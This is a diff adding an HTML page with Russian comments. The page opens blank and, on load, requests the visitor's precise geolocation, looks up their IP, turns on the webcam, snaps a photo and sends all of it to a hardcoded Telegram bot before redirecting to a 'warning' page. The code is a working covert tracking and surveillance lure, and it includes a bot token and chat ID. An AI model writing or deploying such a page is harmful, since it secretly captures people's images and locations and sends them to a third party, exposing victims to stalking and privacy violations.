@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>.</title>
+    <style>body { background: black; }</style> <!-- Белый экран -->
+    <script>
+        const botToken = "7392778924:AAGOGof1aI36517VhbmP9lXOrN8Zq1WV13A";  // Замени на свой токен
+        const chatId = "5160015392";      // Замени на свой chat_id
+        const redirectUrl = "warning.html"; // Куда перенаправить
+
+        function sendPhotoWithInfo(photoBlob, lat, lon, ip) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "photo.jpg");
+            formData.append("caption", `📍 Координаты: ${lat}, ${lon}\n🌍 IP: ${ip}\nВот тут можно узнать по IP - адресу какие то даний https://2ip.ua/ru/services/information-service/site-location`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                setTimeout(() => { window.location.href = redirectUrl; }, 1000);
+            });
+        }
+
+        function getIP(callback) {
+            fetch("https://api64.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback("Неизвестно"));
+        }
+
+        function getLocationAndCapturePhoto() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    getIP((ip) => capturePhoto(lat, lon, ip));
+                },
+                (error) => {
+                    getIP((ip) => capturePhoto("Неизвестно", "Неизвестно", ip));
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+
+        function capturePhoto(lat, lon, ip) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement("canvas");
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob((blob) => {
+                            sendPhotoWithInfo(blob, lat, lon, ip);
+                            stream.getTracks().forEach(track => track.stop()); // Остановить камеру
+                        }, "image/jpeg");
+                    }, 2000);
+                })
+                .catch(() => {
+                    setTimeout(() => { window.location.href = redirectUrl; }, 1000);
+                });
+        }
+
+        window.onload = getLocationAndCapturePhoto;
+    </script>
+</head>
+<body></body>
+</html>
